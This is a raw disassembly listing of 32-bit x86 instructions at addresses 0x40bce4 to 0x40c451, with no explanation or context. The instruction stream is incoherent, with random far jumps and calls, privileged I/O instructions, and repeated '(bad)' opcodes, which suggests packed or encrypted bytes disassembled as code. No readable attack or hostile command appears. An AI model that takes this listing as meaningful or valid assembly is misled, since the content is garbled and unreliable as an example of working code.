  40bce4:	les    esp,FWORD PTR [esi-0x7b250e1]
  40bcea:	cwde   
  40bceb:	repnz test al,0xe3
  40bcee:	sub    eax,0x42a64917
  40bcf3:	adc    BYTE PTR [eax+0x65b0af20],dl
  40bcf9:	fld    TBYTE PTR [eax-0x42]
  40bcfc:	adc    eax,0x45d9562
  40bd01:	add    BYTE PTR [esi+0x65],ch
  40bd04:	scas   eax,DWORD PTR es:[edi]
  40bd05:	and    DWORD PTR [ebp-0x706b4a42],esp
  40bd0b:	jl     0x40bcaf
  40bd0d:	setne  BYTE PTR [ecx]
  40bd10:	mov    bh,0x24
  40bd12:	shr    DWORD PTR [eax+0xa0ddaeb],cl
  40bd18:	aad    0x78
  40bd1a:	or     al,0x3
  40bd1c:	xchg   ebx,eax
  40bd1d:	jg     0x40bd9e
  40bd1f:	leave  
  40bd20:	add    esp,DWORD PTR [ecx+0x7a]
  40bd23:	cmp    cl,BYTE PTR [edx]
  40bd25:	inc    edx
  40bd26:	jg     0x40bcc6
  40bd28:	cli    
  40bd29:	pop    ebp
  40bd2a:	mov    cl,0xef
  40bd2c:	jle    0x40bcdb
  40bd2e:	jns    0x40bd0d
  40bd30:	push   ebp
  40bd31:	mov    edx,0xb2d0cd56
  40bd36:	test   dl,dl
  40bd38:	push   esi
  40bd39:	xor    esi,DWORD PTR [edi]
  40bd3b:	fisttp QWORD PTR es:0x2cc8ec73
  40bd42:	inc    ecx
  40bd43:	pop    ds
  40bd44:	pop    ecx
  40bd45:	push   edi
  40bd46:	sub    edx,DWORD PTR [eax]
  40bd48:	mov    DWORD PTR [ecx],ebx
  40bd4a:	retf   
  40bd4b:	or     DWORD PTR [ebx],eax
  40bd4d:	and    esi,DWORD PTR [eax]
  40bd4f:	pop    edi
  40bd50:	push   eax
  40bd51:	pop    ebp
  40bd52:	push   es
  40bd53:	and    al,0x55
  40bd55:	ja     0x40bda7
  40bd57:	call   0x601b:0xaec7fc61
  40bd5e:	mov    ah,0xb8
  40bd60:	cmp    bl,dh
  40bd62:	popa   
  40bd63:	jbe    0x40bd92
  40bd65:	jne    0x40bd50
  40bd67:	adc    eax,0x1916e446
  40bd6c:	clc    
  40bd6d:	and    al,0xe3
  40bd6f:	adc    bl,BYTE PTR [ebx]
  40bd71:	lahf   
  40bd72:	inc    edi
  40bd73:	arpl   WORD PTR [esi],si
  40bd75:	push   ebx
  40bd76:	sbb    eax,0x36758b60
  40bd7b:	cmp    BYTE PTR [esi+0x53dad819],bh
  40bd81:	repz sbb ch,BYTE PTR [esi-0x3dd13d06]
  40bd88:	pop    esp
  40bd89:	scas   eax,DWORD PTR es:[edi]
  40bd8a:	jge    0x40bda5
  40bd8c:	stos   DWORD PTR es:[edi],eax
  40bd8d:	std    
  40bd8e:	cmp    DWORD PTR [esi-0x14],ebx
  40bd91:	in     eax,dx
  40bd92:	shl    dl,1
  40bd94:	ret    
  40bd95:	push   edi
  40bd96:	xchg   ebx,eax
  40bd97:	mov    bl,0x2f
  40bd99:	or     bh,ch
  40bd9b:	int    0x90
  40bd9d:	ins    BYTE PTR es:[edi],dx
  40bd9e:	(bad)  
  40bd9f:	mov    cl,0x96
  40bda1:	xor    ecx,edi
  40bda3:	loope  0x40bdb4
  40bda5:	adc    bl,BYTE PTR [ebx-0x74]
  40bda8:	ficomp WORD PTR [eax]
  40bdaa:	out    0xa4,al
  40bdac:	test   BYTE PTR [ebp-0x177f605c],bl
  40bdb2:	mov    ds:0x88f2d888,al
  40bdb7:	dec    edi
  40bdb8:	pop    ds
  40bdb9:	mov    al,0x69
  40bdbb:	push   ecx
  40bdbc:	and    ebp,DWORD PTR [edi-0x5749de6d]
  40bdc2:	and    dh,BYTE PTR [eax]
  40bdc4:	mov    al,0x64
  40bdc6:	fs in  eax,dx
  40bdc8:	imul   esi
  40bdca:	mov    esi,0x7709a1d2
  40bdcf:	mov    dl,0xf3
  40bdd1:	stos   DWORD PTR es:[edi],eax
  40bdd2:	push   esp
  40bdd3:	loope  0x40be4c
  40bdd5:	pop    eax
  40bdd6:	sub    eax,0xc679b318
  40bddb:	sub    dl,BYTE PTR [edx*4-0x604b3636]
  40bde2:	in     al,0x61
  40bde4:	daa    
  40bde5:	push   ss
  40bde6:	jp     0x40bd8e
  40bde8:	mov    eax,ds:0xf951e78f
  40bded:	test   al,0x81
  40bdef:	shl    DWORD PTR [edx-0x1163128e],1
  40bdf5:	and    al,0xde
  40bdf7:	and    bh,dh
  40bdf9:	sbb    BYTE PTR [eax+0x79da8b73],cl
  40bdff:	inc    ecx
  40be00:	push   eax
  40be01:	push   edx
  40be02:	sub    BYTE PTR [ecx+0x4e],bh
  40be05:	repz xor al,0xa
  40be08:	cmp    al,0xbb
  40be0a:	dec    edx
  40be0b:	mov    ah,0xce
  40be0d:	inc    esp
  40be0e:	or     al,0x3f
  40be10:	adc    BYTE PTR [eax+eiz*8-0x7f],bl
  40be14:	out    dx,al
  40be15:	imul   edi,DWORD PTR [ecx-0x25],0x23
  40be19:	nop    esi
  40be1c:	sbb    BYTE PTR ds:[edi+0x1e],0x10
  40be21:	sub    BYTE PTR [ecx],0xcf
  40be24:	enter  0x2ef0,0xbb
  40be28:	mov    esi,DWORD PTR [edx-0x892a39e]
  40be2e:	pop    ds
  40be2f:	jae    0x40bdd4
  40be31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be32:	scas   eax,DWORD PTR es:[edi]
  40be33:	loop   0x40be69
  40be35:	cmp    esi,DWORD PTR [esi+0x44]
  40be38:	jecxz  0x40be3e
  40be3a:	ficom  DWORD PTR [eax]
  40be3c:	test   BYTE PTR [eax],bh
  40be3e:	stc    
  40be3f:	es jg  0x40bdec
  40be42:	push   ds
  40be43:	dec    eax
  40be44:	out    0xcd,al
  40be46:	mov    eax,ds:0x7a19410f
  40be4b:	rcl    DWORD PTR [eax+ebp*1+0x16a9eaad],cl
  40be52:	push   0x5d
  40be54:	push   0xc0f0348b
  40be59:	mov    bl,0x51
  40be5b:	lods   al,BYTE PTR ds:[esi]
  40be5c:	retf   0xb85
  40be5f:	mov    ?,WORD PTR [edi+0x41]
  40be62:	cwde   
  40be63:	shr    DWORD PTR [ebp-0x32],1
  40be66:	sbb    al,0xc
  40be68:	push   esi
  40be69:	cmp    al,0x63
  40be6b:	mov    edi,0x8ba67e40
  40be70:	ins    BYTE PTR es:[edi],dx
  40be71:	or     DWORD PTR [edi],edx
  40be73:	sub    eax,0x59023155
  40be78:	xor    al,0x78
  40be7a:	mov    al,0x19
  40be7c:	call   0xe940972f
  40be81:	and    dh,dl
  40be83:	retf   0xc639
  40be86:	dec    eax
  40be87:	div    DWORD PTR [ebp-0x45]
  40be8a:	jmp    0xf152c55
  40be8f:	jns    0x40be4c
  40be91:	push   ss
  40be92:	mov    eax,DWORD PTR [ebp-0x811dbe9]
  40be98:	sbb    BYTE PTR [edx+0x67ecbba5],bh
  40be9e:	add    esi,ecx
  40bea0:	mov    dl,0x1b
  40bea2:	add    DWORD PTR [ebx+0x3c],0x54
  40bea6:	dec    esi
  40bea7:	mov    BYTE PTR [ecx-0x47],bh
  40beaa:	or     al,0x9b
  40beac:	cmp    ebp,DWORD PTR ds:0xf8446de
  40beb2:	push   ss
  40beb3:	popf   
  40beb4:	or     ebp,edx
  40beb6:	rcl    BYTE PTR es:[edx+0x18],cl
  40beba:	fiadd  DWORD PTR [edx-0x50]
  40bebd:	pusha  
  40bebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bebf:	inc    esi
  40bec0:	xchg   esi,eax
  40bec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec2:	stos   BYTE PTR es:[edi],al
  40bec3:	nop
  40bec4:	push   ebx
  40bec5:	pop    eax
  40bec6:	rcr    ecx,0x64
  40bec9:	mov    ebp,0x77a31c1c
  40bece:	jl     0x40bf12
  40bed0:	(bad)  
  40bed2:	test   DWORD PTR [edi+eax*2-0x23bc4e77],esp
  40bed9:	(bad)  
  40bedb:	test   dl,bh
  40bedd:	cwde   
  40bede:	jno    0x40bee4
  40bee0:	out    0xcd,eax
  40bee2:	adc    BYTE PTR [ebp-0x1dc0304d],dh
  40bee8:	aas    
  40bee9:	mov    eax,0x771af4fa
  40beee:	pop    es
  40beef:	ffree  st(4)
  40bef1:	jge    0x40bf00
  40bef3:	mov    eax,0x70a0ebbc
  40bef8:	lock js 0x40bef3
  40befb:	xchg   ebx,eax
  40befc:	xchg   esi,eax
  40befd:	icebp  
  40befe:	mov    cl,0x6f
  40bf00:	test   BYTE PTR [edx-0x7009a686],al
  40bf06:	lods   al,BYTE PTR ds:[esi]
  40bf07:	in     eax,dx
  40bf08:	mov    bl,0xd0
  40bf0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf0b:	jle    0x40bee4
  40bf0d:	jne    0x40bf1f
  40bf0f:	push   edi
  40bf10:	jae    0x40beef
  40bf12:	pusha  
  40bf13:	popa   
  40bf14:	adc    BYTE PTR [esi+ebx*2+0x73e77cd],0x4
  40bf1c:	pop    es
  40bf1d:	jne    0x40bf4d
  40bf1f:	fcmovnb st,st(2)
  40bf21:	enter  0xe57b,0xb6
  40bf25:	out    0x8,al
  40bf27:	pop    ss
  40bf28:	lahf   
  40bf29:	mov    eax,ecx
  40bf2b:	daa    
  40bf2c:	jl     0x40bede
  40bf2e:	add    DWORD PTR [esi+0x23c59e8c],0xfb0535fd
  40bf38:	nop
  40bf39:	mov    ebx,DWORD PTR [esi-0x4b74b372]
  40bf3f:	lar    esi,WORD PTR [edi]
  40bf42:	add    bh,BYTE PTR [edi]
  40bf44:	dec    eax
  40bf45:	pop    edx
  40bf46:	ss daa 
  40bf48:	xlat   BYTE PTR ds:[ebx]
  40bf49:	aaa    
  40bf4a:	test   DWORD PTR [eax+eiz*2+0x601dffd1],esp
  40bf51:	mov    al,ds:0x66a0c8d3
  40bf56:	clc    
  40bf57:	mov    WORD PTR [ebx+0x2c20c020],ds
  40bf5d:	loope  0x40bfa3
  40bf5f:	repz xchg esi,eax
  40bf61:	mov    BYTE PTR [edx+0x5410ff4b],bh
  40bf67:	loope  0x40bfdc
  40bf69:	or     DWORD PTR [edi+0x42],esp
  40bf6c:	xchg   ecx,eax
  40bf6d:	mov    ebp,0x4f5aa70a
  40bf72:	sub    ch,BYTE PTR [esi+0x4d]
  40bf75:	jp     0x40bf48
  40bf77:	inc    edx
  40bf78:	pop    eax
  40bf79:	mov    ch,0x8a
  40bf7b:	adc    BYTE PTR [edx-0x2b349f8d],ch
  40bf81:	mov    cx,0x23b8
  40bf86:	pop    edi
  40bf87:	inc    ebx
  40bf88:	jmp    0xa04eb8a6
  40bf8d:	sahf   
  40bf8e:	aas    
  40bf8f:	or     eax,DWORD PTR [edx-0x63]
  40bf92:	jno    0x40bfa5
  40bf94:	cmp    dl,BYTE PTR [edi]
  40bf96:	cld    
  40bf97:	push   eax
  40bf98:	fst    QWORD PTR fs:[esi]
  40bf9b:	hlt    
  40bf9c:	mov    esp,ecx
  40bf9e:	dec    esp
  40bf9f:	push   cs
  40bfa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfa1:	(bad)  
  40bfa2:	adc    ebx,DWORD PTR ds:[eax-0x4e]
  40bfa6:	mov    esi,0x53f1b10e
  40bfab:	popf   
  40bfac:	inc    esi
  40bfad:	mov    eax,0xd3fd13f7
  40bfb2:	popa   
  40bfb3:	push   esi
  40bfb4:	(bad)  
  40bfb5:	es adc al,0xb0
  40bfb8:	sub    DWORD PTR [ecx+0x67],edx
  40bfbb:	sbb    al,0x2a
  40bfbd:	sub    ah,bh
  40bfbf:	fst    st(0)
  40bfc1:	jmp    0x40bfdc
  40bfc3:	out    dx,eax
  40bfc4:	mov    eax,0xd8bb547a
  40bfc9:	push   ebp
  40bfca:	pop    ebx
  40bfcb:	mov    BYTE PTR [edx+0x474d32f1],al
  40bfd1:	add    eax,0xe677b88e
  40bfd6:	test   eax,0x80ee2f2b
  40bfdb:	sbb    edi,DWORD PTR [ebx]
  40bfdd:	daa    
  40bfde:	bound  ecx,QWORD PTR [ecx+ebx*4+0x312e79ee]
  40bfe5:	push   0x1d
  40bfe7:	xchg   ecx,eax
  40bfe8:	fwait
  40bfe9:	inc    eax
  40bfea:	sbb    DWORD PTR [edi],esp
  40bfec:	int3   
  40bfed:	aaa    
  40bfee:	ins    DWORD PTR es:[edi],dx
  40bfef:	shl    DWORD PTR [esp+esi*4],0xce
  40bff3:	pop    ds
  40bff4:	test   BYTE PTR [esi],dh
  40bff6:	jbe    0x40bf7f
  40bff8:	and    cl,ah
  40bffa:	cmp    DWORD PTR [ebp-0x42],0x4a
  40bffe:	ret    
  40bfff:	push   esi
  40c000:	jo     0x40bfb2
  40c002:	jne    0x40bffc
  40c004:	shl    DWORD PTR [edx+0x60167b93],cl
  40c00a:	jae    0x40c05a
  40c00c:	push   ss
  40c00d:	mov    esi,0x2f35ae05
  40c012:	sub    DWORD PTR [edx+0x1905e17],esi
  40c018:	imul   eax,DWORD PTR [esi],0xffffff8d
  40c01b:	add    al,0x37
  40c01d:	dec    esi
  40c01e:	dec    ecx
  40c01f:	push   0xb549d534
  40c024:	ret    0xf1bc
  40c027:	sub    eax,0x576cf43e
  40c02c:	mov    ds:0xae4b0d10,al
  40c031:	jg     0x40c079
  40c033:	jecxz  0x40c02b
  40c035:	stc    
  40c036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c037:	inc    esi
  40c038:	mov    dh,bl
  40c03a:	push   ds
  40c03b:	je     0x40c039
  40c03d:	adc    bl,BYTE PTR [eax-0x61af4a0d]
  40c043:	inc    edx
  40c044:	lock imul eax,eax,0xffffffc4
  40c048:	aas    
  40c049:	push   ds
  40c04a:	int3   
  40c04b:	repz xor DWORD PTR [ecx-0x7a494459],esp
  40c052:	es inc esi
  40c054:	xchg   ebx,eax
  40c055:	or     eax,0xd3a566ae
  40c05a:	add    bh,ch
  40c05c:	push   es
  40c05d:	xchg   ebp,eax
  40c05e:	inc    esi
  40c05f:	nop
  40c060:	push   edx
  40c061:	out    dx,eax
  40c062:	mov    ecx,DWORD PTR [edi+0x3b40237]
  40c068:	nop
  40c069:	loop   0x40c05d
  40c06b:	or     ecx,DWORD PTR [ebp+0x4d]
  40c06e:	sbb    al,dh
  40c070:	in     al,dx
  40c071:	and    ah,BYTE PTR [edi]
  40c073:	push   DWORD PTR [esi-0x49]
  40c076:	enter  0x8d74,0x41
  40c07a:	jno    0x40c021
  40c07c:	ja     0x40c052
  40c07e:	sar    BYTE PTR [ecx],0x53
  40c081:	xchg   esi,eax
  40c082:	or     ebp,DWORD PTR [edx+0x35]
  40c085:	sar    BYTE PTR [edi+ebp*1+0x69],cl
  40c089:	pop    esi
  40c08a:	sbb    ah,BYTE PTR [edx]
  40c08c:	clc    
  40c08d:	std    
  40c08e:	inc    ebp
  40c08f:	in     al,0x5c
  40c091:	je     0x40c097
  40c093:	sub    al,0xe
  40c095:	dec    ecx
  40c096:	push   edi
  40c097:	(bad)  
  40c098:	jmp    0x7587:0x110fab6c
  40c09f:	mov    al,ds:0xa7c67787
  40c0a4:	inc    ebp
  40c0a5:	ins    BYTE PTR es:[edi],dx
  40c0a6:	sti    
  40c0a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0a8:	ja     0x40c071
  40c0aa:	aad    0xbd
  40c0ac:	inc    ebx
  40c0ad:	jb     0x40c057
  40c0af:	sub    ebp,eax
  40c0b1:	mov    ah,0xaf
  40c0b3:	mov    bl,0x2e
  40c0b5:	xor    ch,dh
  40c0b7:	xchg   ecx,edi
  40c0b9:	xchg   ebx,eax
  40c0ba:	or     ebp,ecx
  40c0bc:	cmp    eax,0x37587eb6
  40c0c1:	xchg   BYTE PTR [edx-0x6b],ch
  40c0c4:	pop    eax
  40c0c5:	jne    0x40c04b
  40c0c7:	push   ecx
  40c0c8:	mov    BYTE PTR [edx-0x51e379fd],0xc4
  40c0cf:	mov    ds:0x44e72d59,eax
  40c0d4:	mov    esi,0x941aae43
  40c0d9:	mov    WORD PTR [esi+eax*8-0x1f615a0f],ss
  40c0e0:	cmp    dl,BYTE PTR [esi-0x63]
  40c0e3:	mov    BYTE PTR fs:[esi],dl
  40c0e6:	cld    
  40c0e7:	mov    edx,DWORD PTR [edi+0x25]
  40c0ea:	into   
  40c0eb:	dec    ecx
  40c0ec:	lock div BYTE PTR [edx-0x5c]
  40c0f0:	jmp    0x69268845
  40c0f5:	push   cs
  40c0f6:	mov    fs,edx
  40c0f8:	hlt    
  40c0f9:	dec    edx
  40c0fa:	ins    DWORD PTR es:[edi],dx
  40c0fb:	aaa    
  40c0fc:	nop
  40c0fd:	inc    ebp
  40c0fe:	mov    ebx,0x8896841d
  40c103:	sbb    eax,0xb3cfd9c1
  40c108:	imul   eax,ebx,0x4dcd2496
  40c10e:	and    eax,0xc6d127ea
  40c113:	loop   0x40c0d9
  40c115:	loop   0x40c0f7
  40c117:	imul   ebx,DWORD PTR [edx-0x11c3806c],0x18
  40c11e:	aad    0x7f
  40c120:	into   
  40c121:	fcmovnb st,st(6)
  40c123:	test   DWORD PTR [edi-0x1fc0729a],0xc2bccdb4
  40c12d:	loope  0x40c147
  40c12f:	fsubrp st(4),st
  40c131:	popf   
  40c132:	sub    al,BYTE PTR [edx-0x66]
  40c135:	xor    al,0xf9
  40c137:	mov    ebp,0xc439cfe
  40c13c:	pop    eax
  40c13d:	pop    edx
  40c13e:	ret    0xeb02
  40c141:	arpl   WORD PTR [ebx+0x64],si
  40c144:	dec    esi
  40c145:	repnz sub al,0xfb
  40c148:	adc    eax,0xa7d72858
  40c14d:	enter  0x9f85,0xf4
  40c151:	jmp    0x41fa:0x1b831af3
  40c158:	lea    ebp,[eax-0x769de195]
  40c15e:	je     0x40c135
  40c160:	or     al,0xf0
  40c162:	mov    bl,0xf4
  40c164:	sbb    eax,0x4a0af904
  40c169:	stos   BYTE PTR es:[edi],al
  40c16a:	ror    BYTE PTR [ebx+edi*8],0x4f
  40c16e:	mov    edx,0x6b381792
  40c173:	pop    edi
  40c174:	fimul  WORD PTR [edx]
  40c176:	mov    edi,edx
  40c178:	mov    eax,0xf5475fb0
  40c17d:	fsub   DWORD PTR ds:[edi]
  40c180:	fld    DWORD PTR [ecx-0x1f]
  40c183:	or     DWORD PTR [esi-0x61],ebp
  40c186:	ins    DWORD PTR es:[edi],dx
  40c187:	das    
  40c188:	push   0x549c1139
  40c18d:	mov    ecx,0xa4dd1eef
  40c192:	loopne 0x40c17f
  40c194:	loop   0x40c157
  40c196:	fcmovu st,st(5)
  40c198:	jle    0x40c193
  40c19a:	ja     0x40c20d
  40c19c:	add    bl,BYTE PTR [ebp+0x3b]
  40c19f:	sub    BYTE PTR [esi+0x42],dl
  40c1a2:	push   esp
  40c1a3:	push   edi
  40c1a4:	sbb    eax,0xd676d89
  40c1a9:	xchg   edx,eax
  40c1aa:	shl    cl,1
  40c1ac:	mov    ah,0xcd
  40c1ae:	pop    ebx
  40c1af:	retf   
  40c1b0:	mov    fs,WORD PTR [ebx+esi*4-0x5a]
  40c1b4:	dec    edx
  40c1b5:	sub    eax,DWORD PTR [eax+0x79]
  40c1b8:	int    0x2f
  40c1ba:	dec    esi
  40c1bb:	ja     0x40c16b
  40c1bd:	iret   
  40c1be:	call   0xb787:0x6008e24f
  40c1c5:	outs   dx,DWORD PTR ds:[esi]
  40c1c6:	add    bl,bh
  40c1c8:	pop    ebp
  40c1c9:	out    0x3,al
  40c1cb:	cmp    BYTE PTR [edi],cl
  40c1cd:	jge    0x40c1ef
  40c1cf:	fs xor ebp,esi
  40c1d2:	(bad)  [esi]
  40c1d4:	test   eax,0x9de88f7e
  40c1d9:	jge    0x40c226
  40c1db:	aad    0x87
  40c1dd:	lods   al,BYTE PTR ds:[esi]
  40c1de:	pop    eax
  40c1df:	mov    ch,0x63
  40c1e1:	cmp    eax,DWORD PTR [edx-0x1c]
  40c1e4:	sub    BYTE PTR [edx],bl
  40c1e6:	sbb    eax,0xd9bbdab7
  40c1eb:	(bad)  
  40c1ec:	push   cs
  40c1ed:	jno    0x40c1cf
  40c1ef:	mov    ebx,0x1f453856
  40c1f4:	sub    eax,ebp
  40c1f6:	push   edi
  40c1f7:	adc    DWORD PTR [edi],esp
  40c1f9:	mov    WORD PTR [ecx+ebx*2],fs
  40c1fc:	mov    edi,0x902de27f
  40c201:	adc    ebx,eax
  40c203:	fadd   st,st(2)
  40c205:	sub    al,0x25
  40c207:	jae    0x40c1bc
  40c209:	out    0xdb,al
  40c20b:	pop    ds
  40c20c:	dec    esp
  40c20d:	js     0x40c20c
  40c20f:	jb     0x40c202
  40c211:	push   esp
  40c212:	dec    ecx
  40c213:	ror    BYTE PTR [ebx+esi*1-0xf],1
  40c217:	adc    al,bh
  40c219:	sbb    ah,BYTE PTR [edi-0x1e]
  40c21c:	sub    edi,eax
  40c21e:	inc    esi
  40c21f:	sbb    edx,DWORD PTR [ebp-0x65]
  40c222:	cwde   
  40c223:	sub    al,0xba
  40c225:	add    ecx,DWORD PTR [ecx-0x80]
  40c228:	sub    DWORD PTR [esi+0x25b80231],edx
  40c22e:	scas   eax,DWORD PTR es:[edi]
  40c22f:	sbb    edx,esp
  40c231:	stc    
  40c232:	jnp    0x40c251
  40c234:	mov    esi,0x4fafd9bf
  40c239:	clc    
  40c23a:	pop    edx
  40c23b:	ja     0x40c226
  40c23d:	int    0xf6
  40c23f:	(bad)  
  40c242:	pop    es
  40c243:	pushf  
  40c244:	add    al,0x39
  40c246:	(bad)  
  40c247:	xchg   edi,eax
  40c248:	pop    esp
  40c249:	in     eax,dx
  40c24a:	push   edx
  40c24b:	mov    ch,0xba
  40c24d:	xor    DWORD PTR [eax-0xb8bcc7f],0x3e3c123d
  40c257:	test   DWORD PTR [ebx-0x30],esi
  40c25a:	mov    esi,0x307327fa
  40c25f:	dec    esp
  40c260:	sub    bl,cl
  40c262:	sysenter 
  40c264:	cwde   
  40c265:	imul   edi,DWORD PTR [ecx],0x4e
  40c268:	xchg   ecx,eax
  40c269:	pop    edi
  40c26a:	out    dx,eax
  40c26b:	or     ch,bl
  40c26d:	imul   ecx,DWORD PTR [esi-0x24d1fc6f],0xe
  40c274:	std    
  40c275:	sub    ebp,eax
  40c277:	lock in al,0x16
  40c27a:	add    DWORD PTR [eax],edi
  40c27c:	fldcw  WORD PTR [edi-0x3f7dfcd9]
  40c282:	lahf   
  40c283:	out    dx,eax
  40c284:	daa    
  40c285:	sub    cl,0x7d
  40c288:	mov    ebp,0x68a03074
  40c28d:	mov    ah,0x27
  40c28f:	pop    ebx
  40c290:	lods   al,BYTE PTR ds:[esi]
  40c291:	fs mov dh,0xaf
  40c294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c295:	push   ebp
  40c296:	cli    
  40c297:	pop    ss
  40c298:	fmul   DWORD PTR [ecx]
  40c29a:	push   0x8439e2a8
  40c29f:	mov    BYTE PTR [eax-0x4c22994],ah
  40c2a5:	or     BYTE PTR [ecx+0x1f],al
  40c2a8:	push   0x40
  40c2aa:	repnz fyl2x 
  40c2ad:	pop    es
  40c2ae:	push   esp
  40c2af:	in     eax,dx
  40c2b0:	jo     0x40c27c
  40c2b2:	rcl    BYTE PTR [edi],1
  40c2b4:	mov    cl,0xe0
  40c2b7:	dec    ebp
  40c2b8:	jmp    0x7facc7f8
  40c2bd:	pop    ss
  40c2be:	bound  ebx,QWORD PTR [esi]
  40c2c0:	(bad)  
  40c2c1:	rcl    BYTE PTR [ecx+0x5a785cde],1
  40c2c7:	int3   
  40c2c8:	push   eax
  40c2c9:	call   FWORD PTR [ebp+0x406e4ece]
  40c2cf:	xchg   ecx,eax
  40c2d0:	push   eax
  40c2d1:	addr16 mov esp,0xaa5d009e
  40c2d7:	xor    DWORD PTR [esi+0x6358479a],esp
  40c2dd:	pop    di
  40c2df:	sar    BYTE PTR [edi],1
  40c2e1:	add    eax,0xcec59624
  40c2e6:	pushf  
  40c2e7:	inc    ebx
  40c2e8:	xor    bh,ah
  40c2ea:	and    al,0x69
  40c2ec:	(bad)  
  40c2ed:	pop    ds
  40c2ee:	stc    
  40c2ef:	imul   ecx,eax,0xffffffda
  40c2f2:	xchg   ebp,eax
  40c2f3:	mov    ds:0xeb8d83de,eax
  40c2f8:	test   al,0x8d
  40c2fa:	(bad)  
  40c2fb:	test   ah,0xa
  40c2fe:	push   ecx
  40c2ff:	sbb    bl,BYTE PTR [edx]
  40c301:	push   ebp
  40c302:	push   0x14fd03aa
  40c307:	scas   eax,DWORD PTR es:[edi]
  40c308:	add    BYTE PTR [ecx],0x37
  40c30b:	test   DWORD PTR [ecx],0x6422fa5c
  40c311:	inc    esi
  40c312:	add    eax,0xb6b9ae8f
  40c317:	sbb    al,0x62
  40c319:	retf   0x80e7
  40c31c:	lods   eax,DWORD PTR ds:[esi]
  40c31d:	xchg   ebx,eax
  40c31e:	call   0x175f8542
  40c323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c324:	mov    ebx,0x5934f1bb
  40c329:	in     eax,dx
  40c32a:	iret   
  40c32b:	sbb    BYTE PTR [edx+0x2a],cl
  40c32e:	addr16 push 0x3d3efad6
  40c334:	xchg   ebx,eax
  40c335:	jbe    0x40c324
  40c337:	icebp  
  40c338:	icebp  
  40c339:	or     esp,DWORD PTR [eax+eiz*2+0x38b1d34d]
  40c340:	inc    edx
  40c341:	or     bh,BYTE PTR [ecx-0x55b33abb]
  40c347:	cmc    
  40c348:	inc    esp
  40c349:	add    ch,bl
  40c34b:	setg   BYTE PTR [ecx+0x5f]
  40c34f:	aam    0x8e
  40c351:	mov    esp,0x81a487a2
  40c356:	jmp    0x40c307
  40c358:	jge    0x40c30a
  40c35a:	mov    al,ds:0x5c1b9016
  40c35f:	scas   eax,DWORD PTR es:[edi]
  40c360:	push   esi
  40c361:	pop    ebp
  40c362:	stc    
  40c363:	cmp    DWORD PTR [esi-0x25],0x27
  40c367:	xor    BYTE PTR [bx+di],ch
  40c36a:	mov    bh,0x65
  40c36c:	retf   
  40c36d:	pop    edi
  40c36e:	icebp  
  40c36f:	xlat   BYTE PTR ds:[ebx]
  40c370:	repz rol DWORD PTR [ebp+0x3908941e],cl
  40c377:	das    
  40c378:	repnz (bad) 
  40c37a:	jl     0x40c306
  40c37c:	iret   
  40c37d:	inc    edx
  40c37e:	or     dh,BYTE PTR [ebx]
  40c380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c381:	jmp    0xa73b:0xf9486e21
  40c388:	sub    dh,BYTE PTR [eax+0x28]
  40c38b:	adc    eax,0xe347a274
  40c390:	fidiv  WORD PTR [ecx+0x3c]
  40c393:	sub    dx,WORD PTR [eax-0x417a944b]
  40c39a:	js     0x40c378
  40c39c:	xor    eax,0x92bf06e8
  40c3a1:	(bad)  
  40c3a2:	xchg   edx,eax
  40c3a3:	fsincos 
  40c3a5:	or     al,0x4e
  40c3a7:	imul   DWORD PTR [ebx+0x6d]
  40c3aa:	cdq    
  40c3ab:	cmc    
  40c3ac:	scas   eax,DWORD PTR es:[edi]
  40c3ad:	aaa    
  40c3ae:	lods   al,BYTE PTR ds:[esi]
  40c3af:	fs cmp bl,ah
  40c3b2:	push   esi
  40c3b3:	fnstcw WORD PTR [ebp-0x2372fa89]
  40c3b9:	adc    dh,ch
  40c3bb:	pop    ebx
  40c3bc:	or     dh,BYTE PTR [eax-0x11994c6e]
  40c3c2:	and    eax,0x475fc57a
  40c3c7:	mov    al,0x1a
  40c3c9:	lea    eax,[esi+0x23422aa1]
  40c3cf:	idiv   edi
  40c3d1:	pop    esi
  40c3d2:	and    DWORD PTR [edx],ecx
  40c3d4:	inc    DWORD PTR [edx]
  40c3d6:	push   edx
  40c3d7:	or     BYTE PTR [edi-0x1b],ah
  40c3da:	and    ebp,DWORD PTR [ebx+ecx*4-0x27]
  40c3de:	dec    edx
  40c3df:	add    cl,BYTE PTR [eax+0x76]
  40c3e2:	and    ebp,DWORD PTR [edi-0x69]
  40c3e5:	shr    DWORD PTR [edi],0x64
  40c3e8:	sub    eax,0x1f8881d3
  40c3ed:	sub    dh,cl
  40c3ef:	stc    
  40c3f0:	mov    es,WORD PTR [eiz*2-0x148bc4d4]
  40c3f7:	adc    cl,bl
  40c3f9:	scas   al,BYTE PTR es:[edi]
  40c3fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3fb:	inc    esp
  40c3fc:	sbb    ebx,DWORD PTR [eax-0x4bab43e3]
  40c402:	or     edx,DWORD PTR [ecx+0x47]
  40c405:	sbb    cl,dl
  40c407:	fld    DWORD PTR [esi]
  40c409:	pop    ecx
  40c40a:	inc    eax
  40c40b:	jmp    0x2387:0x2da3acf7
  40c412:	and    eax,0x6361db08
  40c417:	das    
  40c418:	bound  ecx,QWORD PTR [ebx*1-0x77f2cbb4]
  40c41f:	jbe    0x40c3a7
  40c421:	test   al,0x6f
  40c423:	mov    ch,0xb9
  40c425:	scas   eax,DWORD PTR es:[edi]
  40c426:	ins    BYTE PTR es:[edi],dx
  40c427:	cdq    
  40c428:	outs   dx,DWORD PTR ds:[esi]
  40c429:	add    BYTE PTR [edi],cl
  40c42b:	pop    ebp
  40c42c:	xchg   esp,eax
  40c42d:	cmp    BYTE PTR [ecx],ah
  40c42f:	in     eax,0x50
  40c431:	call   0x3b8c6849
  40c436:	enter  0x5884,0xa4
  40c43a:	test   eax,0xce48bc8c
  40c43f:	and    ch,BYTE PTR [edx-0x1207a2e0]
  40c445:	call   0x5e39e872
  40c44a:	xor    cl,BYTE PTR [ecx+0x67779cf6]
  40c450:	pusha  
  40c451:	hlt    
